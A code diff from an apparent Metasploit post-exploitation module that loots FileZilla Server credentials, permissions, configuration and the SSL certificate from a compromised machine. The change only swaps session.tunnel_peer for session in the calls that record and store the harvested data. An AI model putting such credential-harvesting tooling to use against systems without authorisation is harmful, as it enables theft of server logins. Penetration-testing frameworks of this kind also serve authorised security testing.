@@ -138,7 +138,7 @@ class Metasploit3 < Msf::Post
 
 			# report the goods!
 			report_auth_info(
-				:host  => session.tunnel_peer,
+				:host  => session,
 				:port => config['ftp_port'],
 				:sname => 'ftp',
 				:proto => 'tcp',
@@ -171,7 +171,7 @@ class Metasploit3 < Msf::Post
 
 			# report the goods!
 			report_auth_info(
-				:host  => session.tunnel_peer,
+				:host  => session,
 				:port => config['admin_port'],
 				:sname => 'filezilla-server-admin-interface',
 				:proto => 'tcp',
@@ -182,13 +182,13 @@ class Metasploit3 < Msf::Post
 				:target_port => config['admin_port']
 			)
 
-		store_loot("filezilla.server.creds", "text/csv", session.tunnel_peer, credentials.to_csv, 
+		store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv, 
 			"filezilla_server_credentials.txt", "FileZilla FTP Server Credentials")
 
-		store_loot("filezilla.server.perms", "text/csv", session.tunnel_peer, permissions.to_csv, 
+		store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv, 
 			"filezilla_server_permissions.csv", "FileZilla FTP Server Permissions")
 
-		store_loot("filezilla.server.config", "text/csv", session.tunnel_peer, configuration.to_csv, 
+		store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv, 
 			"filezilla_server_configuration.csv", "FileZilla FTP Server Configuration")
 	end
 
@@ -243,7 +243,7 @@ class Metasploit3 < Msf::Post
 			until sslfile.eof?
 				sslcert << sslfile.read
 			end
-			store_loot("filezilla.server.ssl.cert", "text/plain", session.tunnel_peer, sslfile,
+			store_loot("filezilla.server.ssl.cert", "text/plain", session, sslfile,
 				settings['ssl_cert'] + ".txt", "FileZilla Server SSL Certificate File" )
 			print_status("Looted SSL Certificate File")
 		end
